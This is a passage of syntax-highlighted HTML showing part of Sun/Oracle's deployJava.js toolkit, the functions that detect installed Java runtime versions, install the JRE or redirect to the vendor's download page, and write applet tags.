(deployJava.compareVersionToPattern(deployJava.getPlugin().version, [<span class=\"string\">\"10\"</span>, <span class=\"string\">\"0\"</span>, <span class=\"string\">\"0\"</span>], <span class=\"literal\">false</span>, <span class=\"literal\">true</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (n == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ! k(<span class=\"string\">\"1.6.0_33+\"</span>, n)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> d = &#123;</span><br><span class=\"line\">            debug: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            version: <span class=\"string\">\"20120801\"</span>,</span><br><span class=\"line\">            firefoxJavaVersion: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            myInterval: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            preInstallJREList: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            returnPage: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            brand: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            locale: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            installType: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            EAInstallEnabled: <span class=\"literal\">false</span>,</span><br><span class=\"line\">            EarlyAccessURL: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            getJavaURL: <span class=\"string\">\"http://jdl.sun.com/webapps/getjava/BrowserRedirect?host=java.com\"</span>,</span><br><span class=\"line\">            oldMimeType: <span class=\"string\">\"application/npruntime-scriptable-plugin;DeploymentToolkit\"</span>,</span><br><span class=\"line\">            mimeType: <span class=\"string\">\"application/java-deployment-toolkit\"</span>,</span><br><span class=\"line\">            launchButtonPNG: e(),</span><br><span class=\"line\">            browserName: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            browserName2: <span class=\"literal\">null</span>,</span><br><span class=\"line\">            getJREs: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> r = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isPluginInstalled()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> q = <span class=\"keyword\">this</span>.getPlugin();</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> n = q.jvms;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">0</span>; p &lt; n.getLength(); p++) &#123;</span><br><span class=\"line\">                        r[p] = n.get(p).version</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> o = <span class=\"keyword\">this</span>.getBrowser();</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (o == <span class=\"string\">\"MSIE\"</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingActiveX(<span class=\"string\">\"1.7.0\"</span>)) &#123;</span><br><span class=\"line\">                            r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.7.0\"</span></span><br><span class=\"line\">                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingActiveX(<span class=\"string\">\"1.6.0\"</span>)) &#123;</span><br><span class=\"line\">                                r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.6.0\"</span></span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingActiveX(<span class=\"string\">\"1.5.0\"</span>)) &#123;</span><br><span class=\"line\">                                    r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.5.0\"</span></span><br><span class=\"line\">                                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingActiveX(<span class=\"string\">\"1.4.2\"</span>)) &#123;</span><br><span class=\"line\">                                        r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.4.2\"</span></span><br><span class=\"line\">                                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testForMSVM()) &#123;</span><br><span class=\"line\">                                            r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.1\"</span></span><br><span class=\"line\">                                        &#125;</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (o == <span class=\"string\">\"Netscape Family\"</span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">this</span>.getJPIVersionUsingMimeType();</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.firefoxJavaVersion != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                                r[<span class=\"number\">0</span>] = <span class=\"keyword\">this</span>.firefoxJavaVersion</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingMimeTypes(<span class=\"string\">\"1.7\"</span>)) &#123;</span><br><span class=\"line\">                                    r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.7.0\"</span></span><br><span class=\"line\">                                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingMimeTypes(<span class=\"string\">\"1.6\"</span>)) &#123;</span><br><span class=\"line\">                                        r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.6.0\"</span></span><br><span class=\"line\">                                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingMimeTypes(<span class=\"string\">\"1.5\"</span>)) &#123;</span><br><span class=\"line\">                                            r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.5.0\"</span></span><br><span class=\"line\">                                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingMimeTypes(<span class=\"string\">\"1.4.2\"</span>)) &#123;</span><br><span class=\"line\">                                                r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.4.2\"</span></span><br><span class=\"line\">                                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.browserName2 == <span class=\"string\">\"Safari\"</span>) &#123;</span><br><span class=\"line\">                                                    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingPluginsArray(<span class=\"string\">\"1.7.0\"</span>)) &#123;</span><br><span class=\"line\">                                                        r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.7.0\"</span></span><br><span class=\"line\">                                                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingPluginsArray(<span class=\"string\">\"1.6\"</span>)) &#123;</span><br><span class=\"line\">                                                            r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.6.0\"</span></span><br><span class=\"line\">                                                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                                            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingPluginsArray(<span class=\"string\">\"1.5\"</span>)) &#123;</span><br><span class=\"line\">                                                                r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.5.0\"</span></span><br><span class=\"line\">                                                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                                                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.testUsingPluginsArray(<span class=\"string\">\"1.4.2\"</span>)) &#123;</span><br><span class=\"line\">                                                                    r[<span class=\"number\">0</span>] = <span class=\"string\">\"1.4.2\"</span></span><br><span class=\"line\">                                                                &#125;</span><br><span class=\"line\">                                                            &#125;</span><br><span class=\"line\">                                                        &#125;</span><br><span class=\"line\">                                                    &#125;</span><br><span class=\"line\">                                                &#125;</span><br><span class=\"line\">                                            &#125;</span><br><span class=\"line\">                                        &#125;</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.debug) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> p = <span class=\"number\">0</span>; p &lt; r.length; ++p) &#123;</span><br><span class=\"line\">                        g(<span class=\"string\">\"[getJREs()] We claim to have detected Java SE \"</span> + r[p])</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> r</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            installJRE: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(q, o)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isPluginInstalled() &amp;&amp; <span class=\"keyword\">this</span>.isAutoInstallEnabled(q)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> p = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isCallbackSupported()) &#123;</span><br><span class=\"line\">                        p = <span class=\"keyword\">this</span>.getPlugin().installJRE(q, o)</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        p = <span class=\"keyword\">this</span>.getPlugin().installJRE(q)</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (p) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.refresh();</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.returnPage != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                            <span class=\"built_in\">document</span>.location = <span class=\"keyword\">this</span>.returnPage</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> p</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.installLatestJRE()</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            isAutoInstallEnabled: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(n)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.isPluginInstalled()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> n == <span class=\"string\">\"undefined\"</span>) &#123;</span><br><span class=\"line\">                    n = <span class=\"literal\">null</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> a(n)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            isCallbackSupported: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.isPluginInstalled() &amp;&amp; <span class=\"keyword\">this</span>.compareVersionToPattern(<span class=\"keyword\">this</span>.getPlugin().version, [<span class=\"string\">\"10\"</span>, <span class=\"string\">\"2\"</span>, <span class=\"string\">\"0\"</span>], <span class=\"literal\">false</span>, <span class=\"literal\">true</span>)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            installLatestJRE: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(p)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isPluginInstalled() &amp;&amp; <span class=\"keyword\">this</span>.isAutoInstallEnabled()) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> q = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.isCallbackSupported()) &#123;</span><br><span class=\"line\">                        q = <span class=\"keyword\">this</span>.getPlugin().installLatestJRE(p)</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        q = <span class=\"keyword\">this</span>.getPlugin().installLatestJRE()</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (q) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.refresh();</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.returnPage != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                            <span class=\"built_in\">document</span>.location = <span class=\"keyword\">this</span>.returnPage</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> q</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> o = <span class=\"keyword\">this</span>.getBrowser();</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> n = navigator.platform.toLowerCase();</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((<span class=\"keyword\">this</span>.EAInstallEnabled == <span class=\"string\">\"true\"</span>) &amp;&amp; (n.indexOf(<span class=\"string\">\"win\"</span>) != -<span class=\"number\">1</span>) &amp;&amp; (<span class=\"keyword\">this</span>.EarlyAccessURL != <span class=\"literal\">null</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.preInstallJREList = <span class=\"keyword\">this</span>.getJREs();</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.returnPage != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">this</span>.myInterval = setInterval(<span class=\"string\">\"deployJava.poll()\"</span>, <span class=\"number\">3000</span>)</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        location.href = <span class=\"keyword\">this</span>.EarlyAccessURL;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (o == <span class=\"string\">\"MSIE\"</span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.IEInstall()</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> ((o == <span class=\"string\">\"Netscape Family\"</span>) &amp;&amp; (n.indexOf(<span class=\"string\">\"win32\"</span>) != -<span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.FFInstall()</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                                location.href = <span class=\"keyword\">this</span>.getJavaURL + ((<span class=\"keyword\">this</span>.returnPage != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;returnPage=\"</span> + <span class=\"keyword\">this</span>.returnPage) : <span class=\"string\">\"\"</span>) + ((<span class=\"keyword\">this</span>.locale != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;locale=\"</span> + <span class=\"keyword\">this</span>.locale) : <span class=\"string\">\"\"</span>) + ((<span class=\"keyword\">this</span>.brand != <span class=\"literal\">null</span>) ? (<span class=\"string\">\"&amp;brand=\"</span> + <span class=\"keyword\">this</span>.brand) : <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            runApplet: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(o, t, q)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (q == <span class=\"string\">\"undefined\"</span> || q == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    q = <span class=\"string\">\"1.1\"</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> r = <span class=\"string\">\"^(\\\\d+)(?:\\\\.(\\\\d+)(?:\\\\.(\\\\d+)(?:_(\\\\d+))?)?)?$\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = q.match(r);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.returnPage == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">this</span>.returnPage = <span class=\"built_in\">document</span>.location</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (n != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> p = <span class=\"keyword\">this</span>.getBrowser();</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (p != <span class=\"string\">\"?\"</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.versionCheck(q + <span class=\"string\">\"+\"</span>)) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">this</span>.writeAppletTag(o, t)</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.installJRE(q + <span class=\"string\">\"+\"</span>)) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">this</span>.refresh();</span><br><span class=\"line\">                                location.href = <span class=\"built_in\">document</span>.location;</span><br><span class=\"line\">                                <span class=\"keyword\">this</span>.writeAppletTag(o, t)</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.writeAppletTag(o, t)</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    g(<span class=\"string\">\"[runApplet()] Invalid minimumVersion argument to runApplet():\"</span> + q)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            writeAppletTag: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(q, v)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = <span class=\"string\">\"&lt;applet \"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> p = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> r = <span class=\"string\">\"&lt;/applet&gt;\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> w = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"literal\">null</span> == v || <span class=\"keyword\">typeof</span> v != <span class=\"string\">\"object\"</span>) &#123;</span><br><span class=\"line\">                    v = <span class=\"keyword\">new</span> <span class=\"built_in\">Object</span>()</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> o <span class=\"keyword\">in</span> q) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!c(o)) &#123;</span><br><span class=\"line\">                        v[o] = q[o]</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        n += (<span class=\"string\">\" \"</span> + o + <span class=\"string\">'=\"'</span> + q[o] + <span class=\"string\">'\"'</span>);</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (o == <span class=\"string\">\"code\"</span>) &#123;</span><br><span class=\"line\">                            w = <span class=\"literal\">false</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> u = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> t <span class=\"keyword\">in</span> v) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (t == <span class=\"string\">\"codebase_lookup\"</span>) &#123;</span><br><span class=\"line\">                        u = <span class=\"literal\">true</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (t == <span class=\"string\">\"object\"</span> || t == <span class=\"string\">\"java_object\"</span> || t == <span class=\"string\">\"java_code\"</span>) &#123;</span><br><span class=\"line\">                        w = <span class=\"literal\">false</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    p += <span class=\"string\">'&lt;param name=\"'</span> + t + <span class=\"string\">'\" value=\"'</span> + v[t] + <span class=\"string\">'\"/&gt;'</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!u) &#123;</span><br><span class=\"line\">                    p += <span class=\"string\">'&lt;param name=\"codebase_lookup\" value=\"false\"/&gt;'</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (w) &#123;</span><br><span class=\"line\">                    n += (<span class=\"string\">' code=\"dummy\"'</span>)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                n += <span class=\"string\">\"&gt;\"</span>;</span><br><span class=\"line\">                <span class=\"built_in\">document</span>.write(n + <span class=\"string\">\"\\n\"</span> + p + <span class=\"string\">\"\\n\"</span> + r)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            versionCheck: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(o)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> u = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> w = <span class=\"string\">\"^(\\\\d+)(?:\\\\.(\\\\d+)(?:\\\\.(\\\\d+)(?:_(\\\\d+))?)?)?(\\\\*|\\\\+)?$\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> x = o.match(w);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (x != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> q = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> t = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> p = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> r = <span class=\"number\">1</span>; r &lt; x.length; ++r) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ((<span class=\"keyword\">typeof</span> x[r] == <span class=\"string\">\"string\"</span>) &amp;&amp; (x[r] != <span class=\"string\">\"\"</span>)) &#123;</span><br><span class=\"line\">                            p[u] = x[r];</span><br><span class=\"line\">                            u++</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (p[p.length - <span class=\"number\">1</span>] == <span class=\"string\">\"+\"</span>) &#123;</span><br><span class=\"line\">                        t = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                        q = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                        p.length--</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (p[p.length - <span class=\"number\">1</span>] == <span class=\"string\">\"*\"</span>) &#123;</span><br><span class=\"line\">                            t = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                            q = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                            p.length--</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (p.length &lt; <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">                                t = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                                q = <span class=\"literal\">true</span></span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> v = <span class=\"keyword\">this</span>.getJREs();</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> r = <span class=\"number\">0</span>; r &lt; v.length; ++r) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.compareVersionToPattern(v[r], p, q, t)) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> n = <span class=\"string\">\"Invalid versionPattern passed to versionCheck: \"</span> + o;</span><br><span class=\"line\">                    g(<span class=\"string\">\"[versionCheck()] \"</span> + n);</span><br><span class=\"line\">                    alert(n);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">false</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            isWebStartInstalled: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(q)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> p = <span class=\"keyword\">this</span>.getBrowser();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (p == <span class=\"string\">\"?\"</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (q == <span class=\"string\">\"undefined\"</span> || q == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    q = <span class=\"string\">\"1.4.2\"</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> o = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> r = <span class=\"string\">\"^(\\\\d+)(?:\\\\.(\\\\d+)(?:\\\\.(\\\\d+)(?:_(\\\\d+))?)?)?$\"</span>;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = q.match(r);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (n != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    o = <span class=\"keyword\">this</span>.versionCheck(q + <span class=\"string\">\"+\"</span>)</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    g(<span class=\"string\">\"[isWebStartInstaller()] Invalid minimumVersion argument to isWebStartInstalled(): \"</span> + q);</span><br><span class=\"line\">                    o = <span class=\"keyword\">this</span>.versionCheck(<span class=\"string\">\"1.4.2+\"</span>)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> o</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            getJPIVersionUsingMimeType: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> o = <span class=\"number\">0</span>; o &lt; navigator.mimeTypes.length; ++o) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> p = navigator.mimeTypes[o].type;</span><br><span class=\"line\">                    <span class=\"keyword\">var</span> n = p.match(<span class=\"regexp\">/^application\\/x-java-applet;jpi-version=(.*)$/</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (n != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">this</span>.firefoxJavaVersion = n[<span class=\"number\">1</span>];</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (<span class=\"string\">\"Opera\"</span> != <span class=\"keyword\">this</span>.browserName2) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">break</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            launchWebStartApplication: <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(q)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> n = navigator.userAgent.toLowerCase();</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.getJPIVersionUsingMimeType();</span><br><span class=\"line\">                <span 